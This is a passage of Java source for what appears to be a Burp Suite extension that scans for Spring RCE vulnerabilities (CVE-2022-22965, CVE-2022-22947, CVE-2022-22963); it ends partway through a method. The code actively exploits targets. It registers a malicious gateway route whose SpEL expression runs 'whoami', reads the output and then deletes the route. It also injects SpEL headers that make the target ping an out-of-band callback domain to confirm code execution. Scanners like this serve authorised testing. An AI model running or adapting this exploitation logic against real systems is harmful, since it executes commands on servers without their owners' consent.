package burp.scan;

import burp.*;
import burp.CustomException.CustomException;
import burp.backend.IBackend;
import burp.backend.platform.BurpCollaboratorClient;
import burp.backend.platform.Ceye;
import burp.backend.platform.Digpm;
import burp.backend.platform.Dnslog;
import burp.payload.IPoc;
import burp.ui.tabs.SettingUi;
import burp.util.RandomHeaders;
import burp.util.Utils;

import java.net.MalformedURLException;
import java.net.URL;
import java.util.*;

/**
 * @author : metaStor
 * @date : Created 2022/4/7
 * @description: 主动/被动扫描
 * */
public class Scanner implements IScannerCheck {

    public BurpExtender burpExtender;
    private IExtensionHelpers helpers;

    // 存放每次同类uri的md5, 防止重复扫描
    private final Set<String> allScan = new HashSet<String>();

    // POCS
    private IPoc[] pocs;

    // Backend platform
    private IBackend backend = null;

    // 定时任务
    private Timer timer;

    public Scanner(BurpExtender burpExtender) {
        // 获取父类的操作类
        this.burpExtender = burpExtender;
        this.helpers = this.burpExtender.helpers;
        this.timer = new Timer();
        // 初始化pocs
        this.pocs = Utils.getPocs(new Integer[]{1, 2, 3, 4, 5, 6});
    }

    /**
     * 只做被动扫描
     */
    @Override
    public List<IScanIssue> doPassiveScan(IHttpRequestResponse iHttpRequestResponse) {
        // 插件是否开启
        if(!this.burpExtender.tags.getSettingUi().isEnable()) return null;
        return this.doScan(iHttpRequestResponse);
    }

    @Override
    public List<IScanIssue> doActiveScan(IHttpRequestResponse iHttpRequestResponse, IScannerInsertionPoint iScannerInsertionPoint) {
        return null;
    }

    public List<IScanIssue> doScan(IHttpRequestResponse iHttpRequestResponse) {
        // vul?
        boolean isVul = false;
        List<IScanIssue> issues = new ArrayList<IScanIssue>();
        IRequestInfo requestInfo = this.helpers.analyzeRequest(iHttpRequestResponse);
        IResponseInfo responseInfo = this.helpers.analyzeResponse(iHttpRequestResponse.getResponse());
        String url = String.valueOf(requestInfo.getUrl());
        String url_md5 = normalized(requestInfo);
        // 获取插件功能状态
        boolean isErrorCheck = this.burpExtender.tags.getSettingUi().isErrorCheck();
        boolean isReverseCheck = this.burpExtender.tags.getSettingUi().isReverseCheck();
        // 插件是否开启,跳过静态文件和同类uri
        if ((isErrorCheck || isReverseCheck) && !Utils.isStaticFile(url) && !this.isChecked(url_md5)) {
            this.burpExtender.stdout.println(String.format("[*] Scanning %s", url));
            // 扫描任务状态添加到UI
            int id = this.burpExtender.tags.getScannerUi().add(
                    "ALL",
                    requestInfo.getMethod(),
                    url,
                    String.valueOf(this.helpers.analyzeResponse(iHttpRequestResponse.getResponse()).getStatusCode()),
                    "waiting for test results",
                    iHttpRequestResponse
            );
            /**
             * 回显扫描
             */
            if (isErrorCheck) {
                // Spring Core RCE (CVE-2022-22965)
                if (responseInfo.getStatusCode() != 404) {  // 跳过404
                    IScanIssue errorIssue = this.errorScan(iHttpRequestResponse, false);
                    errorIssue = (errorIssue == null) ? this.errorScan(iHttpRequestResponse, true) : errorIssue;
                    if (errorIssue != null) {
                        isVul = true;
                        this.burpExtender.stdout.println(String.format("[?] ErrorChecker found %s maybe Vul", url));
                        issues.add(errorIssue);
                        // 扫描结果输出到UI
                        this.burpExtender.tags.getScannerUi().save(
                                id,
                                "ErrorCheck",
                                this.burpExtender.helpers.analyzeRequest(errorIssue.getHttpMessages()[0]).getMethod(),
                                String.valueOf(this.burpExtender.helpers.analyzeRequest(errorIssue.getHttpMessages()[0]).getUrl()),
                                String.valueOf(this.helpers.analyzeResponse(errorIssue.getHttpMessages()[0].getResponse()).getStatusCode()),
                                "[?] CVE-2022-22965 (need verify)",
                                errorIssue.getHttpMessages()[0]
                        );
                    }
                }
                // Spring Cloud GateWay SPEL RCE (CVE-2022-22947)
                IScanIssue gatewayIssue = this.CloudGatewayScan(iHttpRequestResponse);
                if (gatewayIssue != null) {
                    isVul = true;
                    this.burpExtender.stdout.println(String.format("[+] RCEChecker found %s Vul!", url));
                    issues.add(gatewayIssue);
                    // 扫描结果输出到UI
                    this.burpExtender.tags.getScannerUi().save(
                            id,
                            "RCECheck",
                            this.burpExtender.helpers.analyzeRequest(gatewayIssue.getHttpMessages()[0]).getMethod(),
                            String.valueOf(this.burpExtender.helpers.analyzeRequest(gatewayIssue.getHttpMessages()[0]).getUrl()),
                            String.valueOf(this.helpers.analyzeResponse(gatewayIssue.getHttpMessages()[0].getResponse()).getStatusCode()),
                            "[+] CVE-2022-22947",
                            gatewayIssue.getHttpMessages()[0]
                    );
                }
                // 已扫描uri的集合
                this.allScan.add(url_md5);
            }
            /**
             * 回连扫描
             */
            if (isReverseCheck) {
                // 初始化回连平台
                try {
                    this.initBackend();
                } catch (CustomException e) {
                    this.burpExtender.tags.getScannerUi().save(
                            id,
                            "unknown",
                            requestInfo.getMethod(),
                            String.valueOf(requestInfo.getUrl()),
                            String.valueOf(this.helpers.analyzeResponse(iHttpRequestResponse.getResponse()).getStatusCode()),
                            e.getMessage(),
                            iHttpRequestResponse
                    );
                }
                // Spring Core RCE (CVE-2022-22965)
                if (responseInfo.getStatusCode() != 404) {  // 跳过404
                    IScanIssue reverseIssue = this.reverseScan(iHttpRequestResponse, false);
                    reverseIssue = (reverseIssue == null) ? this.reverseScan(iHttpRequestResponse, true) : reverseIssue;
                    if (reverseIssue != null) {
                        isVul = true;
                        this.burpExtender.stdout.println(String.format("[+] ReverseChecker found %s Vul!", url));
                        issues.add(reverseIssue);
                        // 扫描结果输出到UI
                        this.burpExtender.tags.getScannerUi().save(
                                id,
                                "ReverseCheck",
                                this.burpExtender.helpers.analyzeRequest(reverseIssue.getHttpMessages()[0]).getMethod(),
                                String.valueOf(this.burpExtender.helpers.analyzeRequest(reverseIssue.getHttpMessages()[0]).getUrl()),
                                String.valueOf(this.helpers.analyzeResponse(reverseIssue.getHttpMessages()[0].getResponse()).getStatusCode()),
                                "[+] CVE-2022-22965",
                                reverseIssue.getHttpMessages()[0]
                        );
                    }
                    // 已扫描uri的集合
                    this.allScan.add(url_md5);
                }
                // Spring Cloud Function SpEL RCE (CVE-2022-22963)
                IScanIssue spelIssue = this.CloudFunctionSpelRCE(iHttpRequestResponse);
                if (spelIssue != null) {
                    isVul = true;
                    this.burpExtender.stdout.println(String.format("[+] ReverseChecker found %s Vul!", url));
                    issues.add(spelIssue);
                    // 扫描结果输出到UI
                    this.burpExtender.tags.getScannerUi().save(
                            id,
                            "ReverseCheck",
                            this.burpExtender.helpers.analyzeRequest(spelIssue.getHttpMessages()[0]).getMethod(),
                            String.valueOf(this.burpExtender.helpers.analyzeRequest(spelIssue.getHttpMessages()[0]).getUrl()),
                            String.valueOf(this.helpers.analyzeResponse(spelIssue.getHttpMessages()[0].getResponse()).getStatusCode()),
                            "[+] CVE-2022-22963",
                            spelIssue.getHttpMessages()[0]
                    );
                }
                this.allScan.add(url_md5);
            }
            // 不存在漏洞, 更新UI
            if (!isVul) {
                this.burpExtender.tags.getScannerUi().save(
                        id,
                        "ALL",
                        requestInfo.getMethod(),
                        String.valueOf(requestInfo.getUrl()),
                        String.valueOf(this.helpers.analyzeResponse(iHttpRequestResponse.getResponse()).getStatusCode()),
                        "[-] Not Found Spring RCE",
                        iHttpRequestResponse
                );
                this.burpExtender.stdout.println(String.format("[-] No Vul %s", url));
            }
        } else {
            this.burpExtender.stdout.println(String.format("[-] Pass %s", url));
        }
        return issues;
    }

    @Override
    public int consolidateDuplicateIssues(IScanIssue iScanIssue, IScanIssue iScanIssue1) {
        return 0;
    }

    private void initBackend() {
        // 回连平台初始化
        SettingUi.Backends backendSelected = this.burpExtender.tags.getSettingUi().getBackendPlatform();
        switch (backendSelected) {
            case Digpm:
                this.backend = new Digpm(this.burpExtender.callbacks);
                break;
            case Dnslog:
                this.backend = new Dnslog(this.burpExtender.callbacks);
                break;
            case BurpCollaborator:
                this.backend = new BurpCollaboratorClient(this.burpExtender.callbacks);
                break;
            case Ceye:
                this.backend = new Ceye(this.burpExtender.callbacks, this.burpExtender);
                break;
        }
        if (this.backend.getRootDomain().equals("")) {
//            this.burpExtender.stdout.println("[+] Load Scanner successfully!");
            this.burpExtender.stderr.println("[-] Fail to load Scanner.");
            throw new CustomException("[-] Fail to load " + backendSelected.toString());
        }
    }

    /**
     * 使用POC1/POC2进行回显检测漏洞
     * @param httpRequestResponse
     * @param reverseMethod 是否变换请求
     * @return SpringCoreIssue
     */
    private IScanIssue errorScan(IHttpRequestResponse httpRequestResponse, boolean reverseMethod) {
        byte[] newHeaderRequest = this.randomHeader(httpRequestResponse);  // 随机Agent-User头
//        this.burpExtender.stdout.println(Utils.bytes2Hex(newHeaderRequest));
        IRequestInfo requestInfo = this.helpers.analyzeRequest(httpRequestResponse);
        String method = requestInfo.getMethod();

        // 验证poc1
        IPoc poc1 = this.pocs[0];
        String[] poc11 = poc1.genPoc().split("=");
        String key = poc11[0];
        String value = String.format(poc11[1], Utils.randomStr(3));
        String value2 = String.format(poc11[1], "false");
        // 将poc作为新参数加入请求中
        IParameter newParam = this.helpers.buildParameter(key, value, ("GET".equalsIgnoreCase(method)) ? IParameter.PARAM_URL : IParameter.PARAM_BODY);
        byte[] newParamReq = this.helpers.addParameter(newHeaderRequest, newParam);
        if (reverseMethod) newParamReq = this.helpers.toggleRequestMethod(newParamReq);
        IHttpRequestResponse requestResponse1 = this.burpExtender.callbacks.makeHttpRequest(httpRequestResponse.getHttpService(), newParamReq);
        IResponseInfo response1 = this.helpers.analyzeResponse(requestResponse1.getResponse());
        // 第一次请求为报错状态码,
        if (Utils.isErrorStatusCode(response1.getStatusCode())) {
            newParam = this.helpers.buildParameter(key, value2, ("GET".equalsIgnoreCase(method)) ? IParameter.PARAM_URL : IParameter.PARAM_BODY);
            newParamReq = this.helpers.addParameter(newHeaderRequest, newParam);
            if (reverseMethod) newParamReq = this.helpers.toggleRequestMethod(newParamReq);
            IHttpRequestResponse requestResponse2 = this.burpExtender.callbacks.makeHttpRequest(httpRequestResponse.getHttpService(), newParamReq);
            IResponseInfo response2 = this.helpers.analyzeResponse(requestResponse2.getResponse());
            // 第二次正常请求，防止扫到原本就报错的站
            if (!Utils.isErrorStatusCode(response2.getStatusCode())) {
                return new SpringIssue(
                        requestInfo.getUrl(),
                        "CVE-2022-22965",
                        0,
                        "Medium",
                        "UnCertain",
                        null,
                        null,
                        "Spring Core RCE (ErrorDetect)" + "\n\n" + newParam.getName() + "=" + newParam.getValue(),
                        null,
                        new IHttpRequestResponse[]{requestResponse2},
                        requestResponse2.getHttpService()
                );
            }
        }

        // 验证poc2
        IPoc poc2 = this.pocs[1];
        String[] poc22 = poc2.genPoc().split("=");
        int ranNum = Utils.getRandom(0, 10);  // [0, 9]随机数字
        key = Utils.urlEncode(String.format(poc22[0], ranNum));
        value = String.format(poc22[1], ranNum);

        newHeaderRequest = this.randomHeader(httpRequestResponse);  // 随机header
        newParam = this.helpers.buildParameter(key, value, ("GET".equalsIgnoreCase(method)) ? IParameter.PARAM_URL : IParameter.PARAM_BODY);
        newParamReq = this.helpers.addParameter(newHeaderRequest, newParam);
        requestResponse1 = this.burpExtender.callbacks.makeHttpRequest(httpRequestResponse.getHttpService(), newParamReq);
        response1 = this.helpers.analyzeResponse(requestResponse1.getResponse());
        // 第一次请求为报错状态码
        if (Utils.isErrorStatusCode(response1.getStatusCode())) {
            // 与正常请求比较，防止扫到原本就报错的站
            if (!Utils.isErrorStatusCode(this.burpExtender.helpers.analyzeResponse(httpRequestResponse.getResponse()).getStatusCode())) {
                return new SpringIssue(
                        requestInfo.getUrl(),
                        "CVE-2022-22965",
                        0,
                        "Medium",
                        "UnCertain",
                        null,
                        null,
                        "Spring Core RCE (ErrorDetect)" + "\n\n" + newParam.getName() + "=" + newParam.getValue(),
                        null,
                        new IHttpRequestResponse[]{requestResponse1},
                        requestResponse1.getHttpService()
                );
            }
        }
        return null;
    }

    /**
     * 使用POC3进行回连检测漏洞
     * @param httpRequestResponse
     * @return SpringCoreIssue
     */
    private IScanIssue reverseScan(IHttpRequestResponse httpRequestResponse, boolean reverseMethod) {
        byte[] newHeaderRequest = this.randomHeader(httpRequestResponse);  // 随机Agent-User头
        IRequestInfo requestInfo = this.helpers.analyzeRequest(httpRequestResponse);
        String method = requestInfo.getMethod();
        String payload = Utils.randomStr(5) + "." + this.backend.generatePayload();

        // poc3
        IPoc poc3 = this.pocs[2];
        String[] poc33 = poc3.genPoc().split("&");
        String key1 = Utils.urlEncode(poc33[0].split("=")[0]);
        String value1 = Utils.urlEncode(String.format(poc33[0].split("=")[1], payload, Utils.randomStr(4)));
        String key2 = Utils.urlEncode(String.format(poc33[1].split("=")[0], Utils.randomStr(2)));
        String value2 = String.format(poc33[1].split("=")[1], Utils.randomStr(2));
        // 构造参数
        IParameter param1 = this.helpers.buildParameter(key1, value1, ("GET".equalsIgnoreCase(method)) ? IParameter.PARAM_URL : IParameter.PARAM_BODY);
        IParameter param2 = this.helpers.buildParameter(key2, value2, ("GET".equalsIgnoreCase(method)) ? IParameter.PARAM_URL : IParameter.PARAM_BODY);
        byte[] newParamsReq = this.helpers.addParameter(newHeaderRequest, param1);
        newParamsReq = this.helpers.addParameter(newParamsReq, param2);
        if (reverseMethod) newParamsReq = this.helpers.toggleRequestMethod(newParamsReq);
        IHttpRequestResponse requestResponse = this.burpExtender.callbacks.makeHttpRequest(httpRequestResponse.getHttpService(), newParamsReq);
        // 请求是否被ban
        if (this.helpers.analyzeResponse(requestResponse.getResponse()).getStatusCode() == 0) return null;
        this.burpExtender.stdout.println("[*] Reverse Checking Spring Core RCE for: " + requestInfo.getUrl().toString() + " ...");
        // 20s内查看是否回连
        try {
            for (int i = 0; i < 2; i++) {
                //                this.burpExtender.stdout.println("[-] No." + i + " Checking " + requestInfo.getUrl().toString());
                if (this.backend.checkResult(payload)) {
                    return new SpringIssue(
                            requestInfo.getUrl(),
                            "CVE-2022-22965",
                            0,
                            "High",
                            "Certain",
                            null,
                            null,
                            "Spring Core RCE" + "\n\n" + key1 + "=" + value1 + "&" + key2 + "=" + value2,
                            null,
                            new IHttpRequestResponse[]{requestResponse},
                            requestResponse.getHttpService()
                    );
                }
                Thread.sleep(10 * 1000);  // sleep 10s
            }
        } catch (Exception e) {
                this.burpExtender.stderr.println(e.getMessage());
                throw new CustomException("[-] BackendPlat is failed");
        }
        return null;
    }

    /**
     * Spring Cloud Function SpEL RCE (CVE-2022-22963)
     * @param httpRequestResponse
     * @return IScanIssue
     */
    private IScanIssue CloudFunctionSpelRCE(IHttpRequestResponse httpRequestResponse) {
        // 加入是否是spring指纹的判断
        if (!this.isSpringFinger(httpRequestResponse, false) && !this.isSpringFinger(httpRequestResponse, true)) return null;
        boolean is500 = false;  // 是否打到500响应
        byte[] newHeaderRequest = this.randomHeader(httpRequestResponse);  // 随机Agent-User头
        IHttpService httpService = httpRequestResponse.getHttpService();
        IRequestInfo requestInfo = this.helpers.analyzeRequest(httpRequestResponse);
        String payload = Utils.randomStr(5) + "." + this.backend.generatePayload();

        // poc4/5
        IPoc poc4 = this.pocs[3];
        IPoc poc5 = this.pocs[4];
        String[] poc44 = poc4.genPoc().split(":");
        // poc4 => key:value
        // poc5 => key:value2
        String key = poc44[0];
        String value = String.format(poc44[1], payload);
        String value2 = String.format(poc5.genPoc().split(":")[1], "ping " + payload);
        // headers加入poc
        byte[] poc4Request = this.CloudFunctionSpelPOC(httpRequestResponse, key, value);
        byte[] poc5Request = this.CloudFunctionSpelPOC(httpRequestResponse, key, value2);
        try {
            // 打当前uri
            IHttpRequestResponse httpRequestResponse1 = this.burpExtender.callbacks.makeHttpRequest(httpService, poc4Request);
            IHttpRequestResponse httpRequestResponse2 = this.burpExtender.callbacks.makeHttpRequest(httpService, poc5Request);
            // 打到500就检测回连
            is500 = this.helpers.analyzeResponse(httpRequestResponse1.getResponse()).getStatusCode() == 500 || this.helpers.analyzeResponse(httpRequestResponse2.getResponse()).getStatusCode() == 500;
            requestInfo = this.helpers.analyzeRequest(httpRequestResponse2);  // record 数据包

            // 打当前uri+/functionRouter
            byte[] frRequest = this.helpers.buildHttpRequest(new URL(httpService.getProtocol(), httpService.getHost(), httpService.getPort(), Utils.getUri(requestInfo.getUrl().toString()) + "functionRouter"));
            IHttpRequestResponse frRequestResponse = this.burpExtender.callbacks.makeHttpRequest(httpService, frRequest);
            // 是否存在默认路由
            if (this.helpers.analyzeResponse(frRequestResponse.getResponse()).getStatusCode() != 404) {
                poc4Request = this.CloudFunctionSpelPOC(frRequestResponse, key, value);
                poc5Request = this.CloudFunctionSpelPOC(frRequestResponse, key, value2);
                httpRequestResponse1 = this.burpExtender.callbacks.makeHttpRequest(httpRequestResponse.getHttpService(), poc4Request);
                httpRequestResponse2 = this.burpExtender.callbacks.makeHttpRequest(httpRequestResponse.getHttpService(), poc5Request);
                requestInfo = this.helpers.analyzeRequest(httpRequestResponse2);  // record 数据包
                // 打到500就检测回连
                is500 = this.helpers.analyzeResponse(httpRequestResponse1.getResponse()).getStatusCode() == 500 || this.helpers.analyzeResponse(httpRequestResponse2.getResponse()).getStatusCode() == 500;
            }
            // 打完check poc再检测是否回连
            if (is500) {
                this.burpExtender.stdout.println("[*] Reverse Checking Spring Cloud Function SpEL RCE for: " + requestInfo.getUrl().toString() + " ...");
                // 20s内查看是否回连
                for (int i = 0; i < 2; i++) {
                    //                    this.burpExtender.stdout.println("[-] No." + i + " Checking Spring Cloud Function SpEL RCE for: " + requestInfo.getUrl().toString());
                    if (this.backend.checkResult(payload)) {
                        return new SpringIssue(
                                requestInfo.getUrl(),
                                "CVE-2022-22963",
                                0,
                                "High",
                                "Certain",
                                null,
                                null,
                                "Spring Cloud Function SpEL RCE" + "\n\n" + "(Maybe) URI: /functionRouter\n" + "Headers: " + key + ":" + value + "\nor\n" + key + ":" + value2,
                                null,
                                new IHttpRequestResponse[]{httpRequestResponse2},
                                httpRequestResponse2.getHttpService()
                        );
                    }
                    Thread.sleep(10 * 1000);  // sleep 10s
                }
                return new SpringIssue(
                        requestInfo.getUrl(),
                        "CVE-2022-22963 [no reverse]",
                        0,
                        "High",
                        "High",
                        null,
                        null,
                        "Spring Cloud Function SpEL RCE" + "\n\n" + "(Maybe) URI: /functionRouter\n" + "Headers: " + key + ":" + value + "\nor\n" + key + ":" + value2,
                        null,
                        new IHttpRequestResponse[]{httpRequestResponse2},
                        httpRequestResponse2.getHttpService()
                );
            }
        } catch (Exception e) {
            e.printStackTrace();
            this.burpExtender.stderr.println(e.getMessage());
            throw new CustomException("[-] BackendPlat is failed");
        }
        return null;
    }

    /**
     * 生成CloudFunctionSpel POC
     * 1. 将key:value作为poc插入到headers中
     * 2. 改GET为POST请求
     * 3. POST内容随机
     * @param httpRequestResponse
     * @param key
     * @param value
     * @return pocRequest
     */
    private byte[] CloudFunctionSpelPOC(IHttpRequestResponse httpRequestResponse, String key, String value) {
        try {
            IRequestInfo requestInfo = this.helpers.analyzeRequest(httpRequestResponse);
            byte[] rawRequest = httpRequestResponse.getRequest();
            List<String> headers = requestInfo.getHeaders();
            headers.add(key + ":" + value);
            headers.set(0, headers.get(0).replace("GET", "POST"));
            headers.removeIf(header -> header != null && header.toLowerCase().startsWith("content-type:"));
            headers.add("Content-type: application/x-www-form-urlencoded");
            rawRequest = new String(rawRequest).substring(requestInfo.getBodyOffset()).getBytes();
            IParameter param = this.helpers.buildParameter(Utils.randomStr(6), "1", IParameter.PARAM_BODY);
            return this.helpers.addParameter(this.helpers.buildHttpMessage(headers, rawRequest), param);
        } catch (Exception e) {
            e.printStackTrace();
            this.burpExtender.stderr.println(e.getMessage());
            return null;
        }
    }

    /**
     * Spring Cloud GateWay SPEL RCE (CVE-2022-22947)
     * 一共发五个请求：
     * 包含恶意SpEL表达式的路由 -> 刷新路由 -> 访问添加的路由查看结果 -> 删除路由 -> 刷新路由
     * TODO: 循环解析URI 判断每一层目录是否具有Spring指纹
     * @param httpRequestResponse
     * @return IScanIssue
     */
    private IScanIssue CloudGatewayScan(IHttpRequestResponse httpRequestResponse) {
        boolean isProdApi = false;
        // 这里判断是否有spring 404的特征: Whitelabel Error Page
        if (!this.isSpringFinger(httpRequestResponse, false) && !this.isSpringFinger(httpRequestResponse, true)) {
            // 无spring 404特征的情况下判断是否有routes
            if (this.isSpringGatewayFinger(httpRequestResponse, true)) {
                isProdApi = true;
            } else if (!this.isSpringGatewayFinger(httpRequestResponse, false)){
                return null;
            }
        }
        URL url = this.helpers.analyzeRequest(httpRequestResponse).getUrl();
        String uri = Utils.getUri(url.toString()) + (isProdApi ? "prod-api/" : "");
        String random_uri = Utils.randomStr(5);
        if (this.CloudGatewayRegisterRoute(httpRequestResponse, uri, random_uri, "whoami")) {
            if (this.CloudGatewayRefresh(httpRequestResponse, uri)) {
                IHttpRequestResponse requestResponse = this.CloudGatewayRoute(httpRequestResponse, uri, random_uri, false);
                if (requestResponse != null) {
                    // 删除路由
                    this.CloudGatewayRoute(httpRequestResponse, uri, random_uri, true);
                    this.CloudGatewayRefresh(httpRequestResponse, uri);
                }
                return new SpringIssue(
                        url,
                        "CVE-2022-22947",
                        0,
                        "High",
                        "Certain",
                        null,
                        null,
                        "Spring Cloud GateWay SPEL RCE",
                        null,
                        new IHttpRequestResponse[]{requestResponse},
                        requestResponse.getHttpService()
                );
            }
        }
        return null;
    }

    /**
     * 注册随机路由并打入POC6
     * @param httpRequestResponse
     * @param uri
     * @return true/false
     */
    private boolean CloudGatewayRegisterRoute(IHttpRequestResponse httpRequestResponse, String uri, String random_uri, String cmd) {
        try {
            IHttpService service = httpRequestResponse.getHttpService();
            // poc
            IPoc poc6 = this.pocs[5];
            String poc66 = this.helpers.bytesToString(this.helpers.base64Decode(poc6.genPoc()));
            poc66 = String.format(poc66, random_uri, cmd);
            byte[] refreshRequest = this.helpers.buildHttpRequest(new URL(service.getProtocol(), service.getHost(), service.getPort(), uri +"actuator/gateway/routes/" + random_uri));
            // headers
            List<String> headers = new ArrayList<String>();
            headers.add("POST " + uri + "actuator/gateway/routes/" + random_uri + " HTTP/1.1");
            headers.add("Host: " + service.getHost() + ":" + service.getPort());
            headers.add("User-Agent: " + RandomHeaders.randomHeader());
            headers.add("Accept-Encoding: gzip, deflate");
            headers.add("Accept-Language: en");
            headers.add("Accept: */*");
            headers.add("Content-Type: application/json");
            headers.add("Connection: close");
            headers.add("Content-Length: " + poc66.length());

            byte[] poc66_byte = this.helpers.stringToBytes(poc66);
            byte[] newRequest = this.helpers.buildHttpMessage(headers, poc66_byte);
//            this.burpExtender.stdout.println(this.helpers.bytesToString(newRequest));

            IHttpRequestResponse requestResponse = this.burpExtender.callbacks.makeHttpRequest(service, newRequest);
            IResponseInfo responseInfo1 = this.helpers.analyzeResponse(requestResponse.getResponse());
            if (responseInfo1.getStatusCode() == 201) return true;
        } catch (MalformedURLException e) {
            e.printStackTrace();
            this.burpExtender.stderr.println(e.getMessage());
        }
        return false;
    }

    /**
     * 刷新路由
     * /actuator/gateway/refresh
     * @return
     */
    private boolean CloudGatewayRefresh(IHttpRequestResponse httpRequestResponse, String uri) {
        try {
            IHttpService service = httpRequestResponse.getHttpService();
            // uri
            byte[] refreshRequest = this.helpers.buildHttpRequest(new URL(service.getProtocol(), service.getHost(), service.getPort(), uri + "actuator/gateway/refresh"));
            // headers
            List<String> headers = new ArrayList<String>();
            headers.add("POST " + uri + "actuator/gateway/refresh HTTP/1.1");
            headers.add("Host: " + service.getHost() + ":" + service.getPort());
            headers.add("User-Agent: " + RandomHeaders.randomHeader());
            headers.add("Accept-Encoding: gzip, deflate");
            headers.add("Accept: */*");
            headers.add("Content-Type: application/x-www-form-urlencoded");
            headers.add("Connection: close");
            // 截取新请求, buildHttpRequest()之后会包含原本的GET请求内容和自定义构造的headers内容, 所以要截取
            IRequestInfo requestInfo = this.helpers.analyzeRequest(service, refreshRequest);
            refreshRequest = new String(refreshRequest).substring(requestInfo.getBodyOffset()).getBytes();
            // 组装请求
            byte[] newRequest = this.helpers.buildHttpMessage(headers, refreshRequest);
            IHttpRequestResponse requestResponse = this.burpExtender.callbacks.makeHttpRequest(service, newRequest);
            IResponseInfo responseInfo1 = this.helpers.analyzeResponse(requestResponse.getResponse());
            if (responseInfo1.getStatusCode() == 200) return true;
        } catch (MalformedURLException e) {
            e.printStackTrace();
            this.burpExtender.stderr.println(e.getMessage());
        }
        return false;
    }

    /**
     * 访问注册的路由获取RCE结果
     * 返回结果响应输出到UI
     * @param httpRequestResponse
     * @param uri
     * @param random_uri
     * @param deleteRoute 是否删除路由
     * @return
     */
    private IHttpRequestResponse CloudGatewayRoute(IHttpRequestResponse httpRequestResponse, String uri, String random_uri, boolean deleteRoute) {
        try {
            IHttpService service = httpRequestResponse.getHttpService();
            // uri
            byte[] refreshRequest = this.helpers.buildHttpRequest(new URL(service.getProtocol(), service.getHost(), service.getPort(), uri + "actuator/gateway/routes/" + random_uri));
            // headers
            List<String> headers = new ArrayList<String>();
            headers.add(((deleteRoute) ? "DELETE " : "GET ") + uri + "actuator/gateway/routes/" + random_uri + " HTTP/1.1");
            headers.add("Host: " + service.getHost() + ":" + service.getPort());
            headers.add("User-Agent: " + RandomHeaders.randomHeader());
            headers.add("Accept-Encoding: gzip, deflate");
            headers.add("Accept: */*");
            headers.add("Content-Type: application/x-www-form-urlencoded");
            headers.add("Connection: close");
            // 截取新请求, buildHttpRequest()之后会包含原本的GET请求内容和自定义构造的headers内容, 所以要截取
            IRequestInfo requestInfo = this.helpers.analyzeRequest(service, refreshRequest);
            refreshRequest = new String(refreshRequest).substring(requestInfo.getBodyOffset()).getBytes();
            // 组装请求
            byte[] newRequest = this.helpers.buildHttpMessage(headers, refreshRequest);
            IHttpRequestResponse requestResponse = this.burpExtender.callbacks.makeHttpRequest(service, newRequest);
            byte[] rawResponse = requestResponse.getResponse();
            IResponseInfo responseInfo1 = this.helpers.analyzeResponse(rawResponse);
            String strResponse = this.helpers.bytesToString(rawResponse);
            if (responseInfo1.getStatusCode() == 200 && strResponse.contains(random_uri) && strResponse.contains("Result")) {
                return requestResponse;
            };
        } catch (MalformedURLException e) {
            e.printStackTrace();
            this.burpExtender.stderr.println(e.getMessage());
        }
        return null;
    }

    /**
     * SpringBoot 1.x
     * 随机访问一个uri路z径, 判断响应内容是否有spring特征 (Whitelabel Error Page)
     *
     * SpringBoot 2.x
     * 访问/actuator/xxx, 判断响应内容是否有spring特征 (Whitelabel Error Page)
     *
     * @param httpRequestResponse
     * @return
     */
    private boolean isSpringFinger(IHttpRequestResponse httpRequestResponse, boolean isVersion2x) {
        try {
            IRequestInfo requestInfo = this.helpers.analyzeRequest(httpRequestResponse);
            IHttpService service = httpRequestResponse.getHttpService();
            String url = requestInfo.getUrl().toString();
            if (isVersion2x) {  // springboot 2.x
                url = Utils.getUri(url) + "actuator/" + Utils.randomStr(5);
            }
            byte[] newRequest = this.helpers.buildHttpRequest(new URL(service.getProtocol(), service.getHost(), service.getPort(), url));
            requestInfo = this.helpers.analyzeRequest(service, newRequest);  // 重新打包好新的uri请求
            // header中Accpet: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
            List<String> headers = requestInfo.getHeaders();
            for (String header: headers) {
                if (header.startsWith("Accept")) {  // 坑点: 带冒号匹配会报错
                    headers.remove(header);
                    headers.add("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
                    break;
                }
            }
            // 截取新请求, buildHttpRequest()之后会包含原本的GET请求内容和自定义构造的headers内容, 所以要截取
            IRequestInfo requestInfo1 = this.helpers.analyzeRequest(service, newRequest);
            newRequest = new String(newRequest).substring(requestInfo1.getBodyOffset()).getBytes();
            // 组装请求
            newRequest = this.helpers.buildHttpMessage(headers, newRequest);
            IHttpRequestResponse requestResponse = this.burpExtender.callbacks.makeHttpRequest(httpRequestResponse.getHttpService(), newRequest);
            String body = new String(requestResponse.getResponse()).substring(this.helpers.analyzeResponse(requestResponse.getResponse()).getBodyOffset()).toLowerCase();
            if (body.contains("whitelabel error page")) {
                this.burpExtender.stdout.println("[*] Detect Spring Finger: " + url);
                return true;
            }
        } catch (MalformedURLException e) {
            e.printStackTrace();
            this.burpExtender.stderr.println(e.getMessage());
        }
        return false;
    }

    /**
     *
     * SpringGateway
     * 访问/actuator/gateway/routes、/prod-api/actuator/gateway/routes
     * 判断响应内容是否有SpringGateway特征: route_id
     *
     * @param httpRequestResponse
     * @return
     */
    private boolean isSpringGatewayFinger(IHttpRequestResponse httpRequestResponse, boolean isProdApi) {
        try {
            IRequestInfo requestInfo = this.helpers.analyzeRequest(httpRequestResponse);
            IHttpService service = httpRequestResponse.getHttpService();
            String url = Utils.getUri(requestInfo.getUrl().toString());
            if (isProdApi) {
                url = url + "prod-api/actuator/gateway/routes";
            } else {
                url = url + "actuator/gateway/routes";
            }
            byte[] newRequest = this.helpers.buildHttpRequest(new URL(service.getProtocol(), service.getHost(), service.getPort(), url));
            requestInfo = this.helpers.analyzeRequest(service, newRequest);  // 重新打包好新的uri请求
            // header中Accpet: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
            List<String> headers = requestInfo.getHeaders();
            for (String header: headers) {
                if (header.startsWith("Accept")) {  // 坑点: 带冒号匹配会报错
                    headers.remove(header);
                    headers.add("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
                    break;
                }
            }
            // 截取新请求, buildHttpRequest()之后会包含原本的GET请求内容和自定义构造的headers内容, 所以要截取
            IRequestInfo requestInfo1 = this.helpers.analyzeRequest(service, newRequest);
            newRequest = new String(newRequest).substring(requestInfo1.getBodyOffset()).getBytes();
            // 组装请求
            newRequest = this.helpers.buildHttpMessage(headers, newRequest);
            IHttpRequestResponse requestResponse = this.burpExtender.callbacks.makeHttpRequest(httpRequestResponse.getHttpService(), newRequest);
